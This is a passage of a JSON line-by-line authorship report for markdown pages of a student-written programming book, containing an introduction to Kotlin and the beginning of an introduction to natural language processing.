        "content": "* [The Billion Dollar Mistake](https://www.infoq.com/presentations/Null-References-The-Billion-Dollar-Mistake-Tony-Hoare)"
      },
      {
        "lineNumber": 172,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 173,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "Tejas2805": 5,
      "jamessspanggg": 2,
      "-": 166
    }
  },
  {
    "path": "contents/kotlin/kotlin.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "-"
        },
        "content": "  title: Introduction to Kotlin"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "-"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "-"
        },
        "content": "# Introduction to Kotlin"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "-"
        },
        "content": "Author: [Shradheya Thakre](https://github.com/tshradheya)"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cbox id\u003d\"article-toc\"\u003e"
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "-"
        },
        "content": "* [Overview‎](#overview)"
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "-"
        },
        "content": "* [Why Kotlin?‎](#why-kotlin)"
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "-"
        },
        "content": "    * [Concise‎](#concise)"
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "-"
        },
        "content": "    * [Safe‎](#safe)"
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "-"
        },
        "content": "    * [Interoperable‎](#interoperable)"
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "-"
        },
        "content": "    * [Tool Friendly‎](#tool-friendly)"
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "-"
        },
        "content": "* [Kotlin for Android Apps‎](#kotlin-for-android-apps)"
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "-"
        },
        "content": "    * [Advantages of Shifting to Kotlin‎](#advantages-of-shifting-to-kotlin)"
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "-"
        },
        "content": "    * [Drawbacks of Shifting to Kotlin‎](#drawbacks-of-shifting-to-kotlin)"
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "-"
        },
        "content": "* [Resources to learn Kotlin‎](#resources-to-learn-kotlin)"
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "-"
        },
        "content": "# Overview"
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "-"
        },
        "content": "Kotlin is a general purpose, open source, statically typed programming language for the JVM and Android that combines object-oriented and functional programming features."
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "-"
        },
        "content": "# Why Kotlin?"
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "-"
        },
        "content": "### Concise"
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "-"
        },
        "content": "Highly reduces the amount of boilerplate code."
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "-"
        },
        "content": "- A Java object with getters, setters, equals(), hashCode(), toString() and copy() can be created in a single line in Kotlin"
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "-"
        },
        "content": "``` kotlin"
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "-"
        },
        "content": "data class Customer(val name: String, val email: String, val company: String)"
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "-"
        },
        "content": "- Assigning values based on ranges is much simpler than Java. Below are extracts of code with similar logic in Java and Kotlin:"
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "-"
        },
        "content": "**Kotlin**"
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "-"
        },
        "content": "``` kotlin"
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "-"
        },
        "content": "val quartile: Int"
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "-"
        },
        "content": "quartile \u003d when (playPercentage) {"
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "-"
        },
        "content": "    in 0..24 -\u003e 0"
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "-"
        },
        "content": "    in 25..49 -\u003e 1"
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "-"
        },
        "content": "    ..."
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "-"
        },
        "content": "**Java**"
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "-"
        },
        "content": "``` java"
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "-"
        },
        "content": "int quartile;"
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "-"
        },
        "content": "if(playPercentage \u003e\u003d 0 \u0026\u0026 playPercentage \u003c\u003d 24) {"
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "-"
        },
        "content": "    quartile \u003d 0;"
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "-"
        },
        "content": "} else if(playPercentage \u003e\u003d 25 \u0026\u0026 playPercentage \u003c\u003d 49) {"
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "-"
        },
        "content": "    quartile \u003d 1;"
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "-"
        },
        "content": "..."
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "-"
        },
        "content": "### Safe"
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "-"
        },
        "content": "Kotlin protects you from mistakenly operating on [nullable](https://kotlinlang.org/docs/reference/null-safety.html) types"
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "-"
        },
        "content": "- Get compilation error when you mistakenly try operating on nullable types"
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "-"
        },
        "content": "``` kotlin"
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "-"
        },
        "content": "val name: String? \u003d null    // Nullable type"
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "-"
        },
        "content": "println(name.length())      // Compilation error"
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "-"
        },
        "content": "### Interoperable"
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "-"
        },
        "content": "- Target either the JVM or JavaScript. Write code in Kotlin and decide where you want to deploy"
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "-"
        },
        "content": "``` kotlin"
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "-"
        },
        "content": "import kotlin.browser.window"
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "-"
        },
        "content": "fun onLoad() {"
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "-"
        },
        "content": "    window.document.body!!.innerHTML +\u003d \"\u003cbr/\u003eHello, Kotlin!\""
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "-"
        },
        "content": "- You can literally continue work on your old Java projects using Kotlin. All your favorite Java frameworks are still available, and whatever framework you’ll write in Kotlin can be easily adopted by other Java developers"
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "-"
        },
        "content": "### Tool Friendly"
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "-"
        },
        "content": "Hyperbolically, a programming language is only as good as what its tools can provide. This is why the advantage of using Kotlin is the built-in language support from IntelliJ. Any Java IDE for e.g. IntelliJ, Eclipse and Android Studio, can be used to write and compile Kotlin code. It also contains the aforementioned Java-to-Kotlin converter and code generators for Java and JavaScript from Kotlin code."
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "-"
        },
        "content": "# Kotlin for Android Apps"
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "-"
        },
        "content": "While Java is one of the world\u0027s most widely used programming languages and is pretty much the official language of Android development, there are many reasons why Java might not always be the best option for your Android projects."
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "-"
        },
        "content": "The biggest issue is that Java isn’t a modern language, and although Java 8 was a huge step forward for the platform, introducing lots of features that developers had been waiting for (including lambda functions), at the time of writing Android only supports a subset of Java 8 features."
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "-"
        },
        "content": "### Advantages of Shifting to Kotlin"
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "-"
        },
        "content": "- Interchangeability With Java"
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "-"
        },
        "content": "- Easy learning curve"
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "-"
        },
        "content": "- Combine the best of functional and procedural programming"
      },
      {
        "lineNumber": 103,
        "author": {
          "gitId": "-"
        },
        "content": "- First-class Android Studio support"
      },
      {
        "lineNumber": 104,
        "author": {
          "gitId": "-"
        },
        "content": "- More concise code"
      },
      {
        "lineNumber": 105,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 106,
        "author": {
          "gitId": "-"
        },
        "content": "### Drawbacks of Shifting to Kotlin"
      },
      {
        "lineNumber": 107,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 108,
        "author": {
          "gitId": "-"
        },
        "content": "- Extra runtime size due to increase in size of `.apk`"
      },
      {
        "lineNumber": 109,
        "author": {
          "gitId": "-"
        },
        "content": "- Initial readability of code may be hindered for core Java developers"
      },
      {
        "lineNumber": 110,
        "author": {
          "gitId": "-"
        },
        "content": "- Smaller community support"
      },
      {
        "lineNumber": 111,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 112,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "# Resources to Learn Kotlin"
      },
      {
        "lineNumber": 113,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 114,
        "author": {
          "gitId": "-"
        },
        "content": "- [Official Resources by Android](https://developer.android.com/kotlin/resources.html)"
      },
      {
        "lineNumber": 115,
        "author": {
          "gitId": "-"
        },
        "content": "- [Kotlin Documentation](https://kotlinlang.org/docs/reference/)"
      },
      {
        "lineNumber": 116,
        "author": {
          "gitId": "-"
        },
        "content": "- [Cheatsheet for shifiting from Java to Kotlin](https://github.com/MindorksOpenSource/from-java-to-kotlin)"
      },
      {
        "lineNumber": 117,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 118,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "Tejas2805": 1,
      "-": 117
    }
  },
  {
    "path": "contents/naturalLanguage/nl.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "j-lum"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "j-lum"
        },
        "content": "  title: Introduction to Natural Language Processing (NLP)"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "j-lum"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "j-lum"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "j-lum"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "j-lum"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "j-lum"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "j-lum"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "j-lum"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "j-lum"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "j-lum"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "j-lum"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "j-lum"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "j-lum"
        },
        "content": "# Introduction to Natural Language Processing (NLP)"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "j-lum"
        },
        "content": "Authors: [Lum Ka Fai Jeffry](https://github.com/j-lum)"
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "j-lum"
        },
        "content": ""
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "j-lum"
        },
        "content": "\u003cbox id\u003d\"article-toc\"\u003e"
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "j-lum"
        },
        "content": "* [What is NLP?](#what-is-nlp)"
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "j-lum"
        },
        "content": "* [Themes in NLP](#themes-in-nlp)"
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "j-lum"
        },
        "content": "   * [Syntax](#syntax)"
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "j-lum"
        },
        "content": "   * [Semantics](#semantics)"
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "j-lum"
        },
        "content": "   * [Relations](#relations)"
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "j-lum"
        },
        "content": "* [Applications of NLP](#applications-of-nlp)"
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "j-lum"
        },
        "content": "* [What\u0027s Next](#whats-next)"
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "j-lum"
        },
        "content": "* [References](#references)"
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "j-lum"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "j-lum"
        },
        "content": ""
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "j-lum"
        },
        "content": "## What is NLP?"
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "j-lum"
        },
        "content": "Natural Language Processing (NLP) is the set of methods for making human language accessible to computers."
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "j-lum"
        },
        "content": "Recent advances in NLP have given rise to useful tools that have become embedded in our daily lives, for example: "
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "j-lum"
        },
        "content": "spam and phishing classification keeps inboxes sane\u003csup\u003e[1](#footnote1)\u003c/sup\u003e;"
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "j-lum"
        },
        "content": "automated chatbots lighten the load on customer support staff and provide customers with immediate feedback\u003csup\u003e[2](#footnote2)\u003c/sup\u003e;"
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "j-lum"
        },
        "content": "machine translation bridge the gap between cultures\u003csup\u003e[3](#footnote3)\u003c/sup\u003e. "
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "j-lum"
        },
        "content": " "
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "j-lum"
        },
        "content": "NLP draws from many other fields of science, from formal linguistics to statistics. "
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "j-lum"
        },
        "content": "The goal of NLP is to provide new computational capabilities around human language: for example, holding a conversation, summarizing an article, and so on."
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "j-lum"
        },
        "content": ""
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "j-lum"
        },
        "content": "Even though the study of NLP covers a diverse range of tasks, most of them can be generalized to three themes: [_syntax_](#syntax), [_semantics_](#semantics) and [_relations_](#relations)."
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "j-lum"
        },
        "content": ""
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "j-lum"
        },
        "content": "## Themes in NLP"
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "j-lum"
        },
        "content": ""
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "j-lum"
        },
        "content": "### Syntax"
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "j-lum"
        },
        "content": "In order to transform language into a form understandable by computers, raw text must be converted to a general-purpose linguistic structure."
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "j-lum"
        },
        "content": "In English, words can be decomposed to _morphemes_, the minimal unit of meaning (e.g. unhappiness to three morphemes un-happy-ness)\u003csup\u003e[4](#footnote4)\u003c/sup\u003e."
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "j-lum"
        },
        "content": "Similarly, sentences can be tagged with word-level _parts-of-speech_ which describe the meaning of each word in the context of that sentence."
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "j-lum"
        },
        "content": ""
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "j-lum"
        },
        "content": "\u003cp align\u003d\"center\"\u003e"
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "j-lum"
        },
        "content": "    \u003cpic src\u003d\"partsOfSpeech.png\" alt\u003d\"partsOfSpeech\" width\u003d\"90%\"\u003e"
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "j-lum"
        },
        "content": "      \u003csub\u003e\u003ci\u003eFigure 1. Parts of Speech\u003c/i\u003e\u003c/sub\u003e"
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "j-lum"
        },
        "content": "    \u003c/pic\u003e"
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "j-lum"
        },
        "content": "\u003c/p\u003e"
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "j-lum"
        },
        "content": ""
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "j-lum"
        },
        "content": "For example, \u0027informative\u0027 is tagged as an adjective (JJ) and \u0027article\u0027 as a noun (NN)\u003csup\u003e[5](#footnote5)\u003c/sup\u003e."
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "j-lum"
        },
        "content": ""
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "j-lum"
        },
        "content": "\u003cp align\u003d\"center\"\u003e"
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "j-lum"
        },
        "content": "    \u003cpic src\u003d\"constituencyParse.png\" alt\u003d\"Constituency Parse\" width\u003d\"90%\"\u003e"
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "j-lum"
        },
        "content": "      \u003csub\u003e\u003ci\u003eFigure 2. Constituency Parse\u003c/i\u003e\u003c/sub\u003e"
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "j-lum"
        },
        "content": "    \u003c/pic\u003e"
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "j-lum"
        },
        "content": "\u003c/p\u003e"
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "j-lum"
        },
        "content": ""
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "j-lum"
        },
        "content": "From the parts-of-speech tags, a tree-structured representation of grammar can be produced."
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "j-lum"
        },
        "content": "This tree is the result of a \u003ctooltip content\u003d\"a constituency parse is an assignment of a syntactic structure to a sentence\"\u003e\u003ci\u003econstituency parse\u003c/i\u003e\u003c/tooltip\u003e."
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "j-lum"
        },
        "content": "From the tree we can see that the phrase \u0027an informative article\u0027 is simply a \u003ctooltip content\u003d\"a noun phrase is a group of words that includes a noun and modifiers like adjectives.\"\u003e\u003ci\u003enoun phrase\u003c/i\u003e\u003c/tooltip\u003e."
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "j-lum"
        },
        "content": "Incidentally, this is how Microsoft Word checks for grammatical errors\u003csup\u003e[6](#footnote6)\u003c/sup\u003e."
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "j-lum"
        },
        "content": "Any tree that cannot be parsed may be grammatically incorrect or difficult to understand."
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "j-lum"
        },
        "content": ""
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "j-lum"
        },
        "content": "### Semantics"
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "j-lum"
        },
        "content": "With the knowledge of a sentence and its structure, the next step is to understand the meaning it conveys."
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "j-lum"
        },
        "content": "To this end, the representation of the meaning of a sentence should be able to link language to concepts\u003csup\u003e[7](#footnote7)\u003c/sup\u003e."
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "j-lum"
        },
        "content": ""
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "j-lum"
        },
        "content": "Take for example the sentence: "
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "j-lum"
        },
        "content": ""
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "j-lum"
        },
        "content": "   \u003e I wrote an article!"
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "j-lum"
        },
        "content": ""
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "j-lum"
        },
        "content": "In order to understand the meaning of the sentence, a few questions need to be answered:"
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "j-lum"
        },
        "content": ""
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "j-lum"
        },
        "content": "* Who is \u0027I\u0027?"
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "j-lum"
        },
        "content": "* What is \u0027an article\u0027? "
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "j-lum"
        },
        "content": "* How are the two subjects related?"
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "j-lum"
        },
        "content": ""
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "j-lum"
        },
        "content": "An approach is to represent the meaning of a sentence as a relationship triple consisting of a *Subject*, *Object* and *Relation*."
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "j-lum"
        },
        "content": ""
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "j-lum"
        },
        "content": "\u003cp align\u003d\"center\"\u003e"
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "j-lum"
        },
        "content": "    \u003cpic src\u003d\"openIE.png\" alt\u003d\"Relation tuple\" width\u003d\"90%\"\u003e"
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "j-lum"
        },
        "content": "      \u003csub\u003e\u003ci\u003eFigure 3. Relation tuple\u003c/i\u003e\u003c/sub\u003e"
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "j-lum"
        },
        "content": "    \u003c/pic\u003e"
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "j-lum"
        },
        "content": "\u003c/p\u003e"
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "j-lum"
        },
        "content": ""
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "j-lum"
        },
        "content": "From this representation of the sentence, it is possible for a system to answer novel questions like \"Who has written articles?\" or \"What are the articles that \u0027I\u0027 have written\"."
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "j-lum"
        },
        "content": "This technique, Open Information Extraction, is utilized by researchers to extract and summarize information from multiple documents.\u003csup\u003e[8](#footnote8)\u003c/sup\u003e"
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "j-lum"
        },
        "content": ""
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "j-lum"
        },
        "content": "### Relations "
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "j-lum"
        },
        "content": "Relations are crucial to the understanding of natural languages."
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "j-lum"
        },
        "content": "Consider the example:"
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "j-lum"
        },
        "content": ""
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "j-lum"
        },
        "content": "   \u003e Geoffrey bought Mary a ring. They have been dating for months."
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "j-lum"
        },
        "content": ""
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "j-lum"
        },
        "content": "What is the event that prompted Geoffrey to buy a ring? "
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "j-lum"
        },
        "content": "The word _proposal_, while not stated in the example, implicitly links the two events together."
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "j-lum"
        },
        "content": "While humans are able to draw the connections instinctually, it is not easy to formalize this process computationally."
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "j-lum"
        },
        "content": ""
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "j-lum"
        },
        "content": "There are attempts to create semantic \u003ctooltip content\u003d\"an ontology is a groupings of words by their meanings\"\u003e\u003ci\u003eontologies\u003c/i\u003e\u003c/tooltip\u003e for natural language."
      },
      {
        "lineNumber": 103,
        "author": {
          "gitId": "j-lum"
        },
        "content": "**WordNet** is one such attempt, a handcrafted database that classifies words by concepts that they express\u003csup\u003e[9](#footnote9)\u003c/sup\u003e."
      },
      {
        "lineNumber": 104,
        "author": {
          "gitId": "j-lum"
        },
        "content": ""
      },
      {
        "lineNumber": 105,
        "author": {
          "gitId": "j-lum"
        },
        "content": "\u003cp align\u003d\"center\"\u003e"
      },
      {
        "lineNumber": 106,
        "author": {
          "gitId": "j-lum"
        },
        "content": "    \u003cpic src\u003d\"wordNet.png\" alt\u003d\"WordNet results for write\" width\u003d\"90%\"\u003e"
      },
      {
        "lineNumber": 107,
        "author": {
          "gitId": "j-lum"
        },
        "content": "      \u003csub\u003e\u003ci\u003eFigure 4. WordNet results for the word \"write\"\u003c/i\u003e\u003c/sub\u003e"
      },
      {
        "lineNumber": 108,
        "author": {
          "gitId": "j-lum"
        },
        "content": "    \u003c/pic\u003e"
      },
      {
        "lineNumber": 109,
        "author": {
          "gitId": "j-lum"
        },
        "content": "\u003c/p\u003e"
      },
      {
        "lineNumber": 110,
        "author": {
          "gitId": "j-lum"
        },
        "content": ""
      },
      {
        "lineNumber": 111,
        "author": {
          "gitId": "j-lum"
        },
        "content": "More recently, techniques like **word2vec**\u003csup\u003e[10](#footnote10)\u003c/sup\u003e are able to model words and phrases as vectors of real numbers. "
      },
      {
        "lineNumber": 112,
        "author": {
          "gitId": "j-lum"
        },
